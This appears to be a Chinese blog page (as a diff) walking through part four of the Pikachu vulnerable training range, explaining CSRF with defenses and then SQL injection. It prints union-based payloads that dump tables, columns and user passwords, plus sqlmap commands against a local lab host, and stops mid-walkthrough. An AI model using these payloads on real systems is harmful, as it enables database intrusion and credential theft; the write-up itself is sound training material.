@@ -1,0 +1,941 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/girl.jpg">
+  <link rel="icon" href="/img/girl.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zizhu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="关于Pikachu靶场的全通关流程，CSRF与SQL注入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场全通关（四）">
+<meta property="og:url" content="http://example.com/2025/03/11/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/index.html">
+<meta property="og:site_name" content="学习笔记">
+<meta property="og:description" content="关于Pikachu靶场的全通关流程，CSRF与SQL注入。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89.png">
+<meta property="article:published_time" content="2025-03-11T09:16:46.000Z">
+<meta property="article:modified_time" content="2025-03-15T12:06:48.299Z">
+<meta property="article:author" content="Zizhu">
+<meta property="article:tag" content="实践">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89.png">
+  
+  
+  
+  <title>Pikachu靶场全通关（四） - 学习笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/dog.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zizhu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wenzhang.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pikachu靶场全通关（四）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-11 17:16" pubdate>
+          2025年3月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pikachu靶场全通关（四）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="一、CSRF"><a href="#一、CSRF" class="headerlink" title="一、CSRF"></a>一、CSRF</h3><h4 id="（1）、概述"><a href="#（1）、概述" class="headerlink" title="（1）、概述"></a>（1）、概述</h4><p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br>场景需求：<br>小黑想要修改大白在购物网站tianxie<a target="_blank" rel="noopener" href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。</a><br>先看下大白是如何修改自己的密码的：<br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>
+<p>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a target="_blank" rel="noopener" href="http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change%E3%80%91">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</p>
+<p>为啥小黑的操作能够实现呢。有如下几个关键点：<br>1.<a target="_blank" rel="noopener" href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
+<p>因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等</p>
+<h4 id="（2）、CSRF-get"><a href="#（2）、CSRF-get" class="headerlink" title="（2）、CSRF(get)"></a>（2）、CSRF(get)</h4><ul>
+<li>首先点击提示，根据提示随便登录一个用户</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E9%9A%8F%E4%BE%BF%E7%99%BB%E5%BD%95%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7.png" srcset="/img/dog.gif" lazyload alt="随便登录一个用户"></p>
+<ul>
+<li>查看以及修改个人信息</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%9F%A5%E7%9C%8B%E4%BF%A1%E6%81%AF.png" srcset="/img/dog.gif" lazyload alt="查看信息"></p>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E4%BF%AE%E6%94%B9%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%8A%93%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="修改个人信息，提交抓包"></p>
+<ul>
+<li>使用burp进行抓包</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%8A%93%E5%8C%85.png" srcset="/img/dog.gif" lazyload alt="抓包"></p>
+<ul>
+<li>生成CSRF</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%82%B9%E5%87%BBCSRF.png" srcset="/img/dog.gif" lazyload alt="点击CSRF"></p>
+<ul>
+<li>修改信息</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E4%BF%A1%E6%81%AF.png" srcset="/img/dog.gif" lazyload alt="修改其中信息"></p>
+<ul>
+<li>打开链接</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E9%93%BE%E6%8E%A5.png" srcset="/img/dog.gif" lazyload alt="用浏览器打开链接"></p>
+<ul>
+<li>点击</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%82%B9%E5%87%BB.png" srcset="/img/dog.gif" lazyload alt="点击"></p>
+<ul>
+<li>信息已经被修改了</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E4%BF%A1%E6%81%AF%E8%A2%AB%E4%BF%AE%E6%94%B9%E4%BA%86.png" srcset="/img/dog.gif" lazyload alt="信息被修改了"></p>
+<h4 id="（3）、CSRF-post-login"><a href="#（3）、CSRF-post-login" class="headerlink" title="（3）、CSRF(post) login"></a>（3）、CSRF(post) login</h4><ul>
+<li>方式和get型相同</li>
+</ul>
+<h4 id="（4）、CSRF-Token"><a href="#（4）、CSRF-Token" class="headerlink" title="（4）、CSRF Token"></a>（4）、CSRF Token</h4><ol>
+<li><p><strong>CSRF Token验证</strong></p>
+<ul>
+<li>服务端为每个会话生成唯一Token</li>
+<li>嵌入表单&#x2F;请求头，提交时校验合法性</li>
+</ul>
+<HTML>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;form&gt;  &lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;csrf_token&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;RANDOM_STRING&quot;</span>&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>SameSite Cookie属性</strong><br> 设置Cookie的<code>SameSite=Strict/Lax</code>，限制跨域携带Cookie</p>
+<HTTP>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Set-Cookie: <span class="hljs-attribute">session</span>=abc123; <span class="hljs-attribute">SameSite</span>=Lax; Secure<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>验证Referer&#x2F;Origin头</strong><br> 检查请求的来源是否为合法域名</p>
+<PYTHON>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> request<span class="hljs-selector-class">.headers</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Origin&#x27;</span>]</span> not <span class="hljs-keyword">in</span> ALLOWED_DOMAINS:    <span class="hljs-built_in">abort</span>(<span class="hljs-number">403</span>)<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h3><h4 id="（1）、概述-1"><a href="#（1）、概述-1" class="headerlink" title="（1）、概述"></a>（1）、概述</h4><p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重。</p>
+<h4 id="（2）、数字型注入"><a href="#（2）、数字型注入" class="headerlink" title="（2）、数字型注入"></a>（2）、数字型注入</h4><ul>
+<li>首先随便查询一下</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E9%9A%8F%E4%BE%BF%E6%9F%A5%E8%AF%A2%E4%B8%80%E4%B8%8B.png" srcset="/img/dog.gif" lazyload alt="随便查询一下"></p>
+<ul>
+<li>使用burp进行抓包并发送到重发器当中</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%8A%93%E5%8C%85%E5%B9%B6%E5%8F%91%E9%80%81%E5%88%B0%E9%87%8D%E5%8F%91%E5%99%A8.png" srcset="/img/dog.gif" lazyload alt="抓包并发送到重发器"></p>
+<ul>
+<li><p>修改输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>![输入and 1&#x3D;1](..&#x2F;img&#x2F;Pikachu靶场全通关（四）&#x2F;输入and 1&#x3D;1.png)</p>
+</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%97%A0%E5%8F%98%E5%8C%96.png" srcset="/img/dog.gif" lazyload alt="无变化"></p>
+<ul>
+<li>输入</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>![输入and 1&#x3D;2](..&#x2F;img&#x2F;Pikachu靶场全通关（四）&#x2F;输入and 1&#x3D;2.png)</p>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%8A%A5%E9%94%99.png" srcset="/img/dog.gif" lazyload alt="报错"></p>
+<ul>
+<li>可以推断出是数字型注入，并使用order by子句进行判断列的行数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p>![order by 2](..&#x2F;img&#x2F;Pikachu靶场全通关（四）&#x2F;order by 2.png)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>![order by 3](..&#x2F;img&#x2F;Pikachu靶场全通关（四）&#x2F;order by 3.png)</p>
+<ul>
+<li>可以得出其只有两列</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%9F%A5%E6%89%BE%E5%88%97%E4%BD%8D%E7%BD%AE.png" srcset="/img/dog.gif" lazyload alt="查找列位置"></p>
+<ul>
+<li>查询数据库版本</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),version()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%BE%97%E5%88%B0%E7%89%88%E6%9C%AC.png" srcset="/img/dog.gif" lazyload alt="得到版本"></p>
+<ul>
+<li>查询表</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%9F%A5%E8%AF%A2%E8%A1%A8.png" srcset="/img/dog.gif" lazyload alt="查询表"></p>
+<ul>
+<li>查找users表当中的所有列</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%9F%A5%E8%AF%A2%E5%88%97.png" srcset="/img/dog.gif" lazyload alt="查询列"></p>
+<ul>
+<li>查找用户名和密码</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(username),group_concat(password) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png" srcset="/img/dog.gif" lazyload alt="用户名密码"></p>
+<ul>
+<li>解密即可</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E8%A7%A3%E5%AF%86%E5%8D%B3%E5%8F%AF.png" srcset="/img/dog.gif" lazyload alt="解密即可"></p>
+<h4 id="（3）、字符型注入"><a href="#（3）、字符型注入" class="headerlink" title="（3）、字符型注入"></a>（3）、字符型注入</h4><ul>
+<li>输入1尝试，发现报错</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E8%BE%93%E5%85%A51.png" srcset="/img/dog.gif" lazyload alt="输入1"></p>
+<ul>
+<li>构造</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%BE%97%E5%88%B0.png" srcset="/img/dog.gif" lazyload alt="得到"></p>
+<ul>
+<li>也可以查询所有的表</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+&amp;submit=查询</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E5%8F%AF%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%85%A5%E5%88%B0url%E5%BD%93%E4%B8%AD.png" srcset="/img/dog.gif" lazyload alt="可直接输入到url当中"></p>
+<h4 id="（4）、搜索型注入"><a href="#（4）、搜索型注入" class="headerlink" title="（4）、搜索型注入"></a>（4）、搜索型注入</h4><ul>
+<li>首先先随便搜索一个东西</li>
+</ul>
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E9%9A%8F%E4%BE%BF%E6%90%9C%E7%B4%A2.png" srcset="/img/dog.gif" lazyload alt="随便搜索"></p>
+<ul>
+<li>使用sqlmap探查注入点</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_search.php?name=<span class="hljs-number">00</span>&amp;submit=<span class="hljs-variable">%E6%</span><span class="hljs-number">90</span><span class="hljs-variable">%9C%</span>E7<span class="hljs-variable">%B4%</span>A2&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E6%88%90%E5%8A%9F%E7%88%86%E5%BA%93.png" srcset="/img/dog.gif" lazyload alt="成功爆库"></p>
+<ul>
+<li>接着继续</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u &quot;http://pikachu:<span class="hljs-number">8848</span>/vul/sqli/sqli_search.php?name=<span class="hljs-number">00</span>&amp;submit=<span class="hljs-variable">%E6%</span><span class="hljs-number">90</span><span class="hljs-variable">%9C%</span>E7<span class="hljs-variable">%B4%</span>A2&quot; --dbs<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%EF%BC%88%E5%9B%9B%EF%BC%89/%E7%88%86%E5%BA%93.png" srcset="/img/dog.gif" lazyload alt="爆库"></p>
+<ul>
+<li>爆表</li>
+</ul>
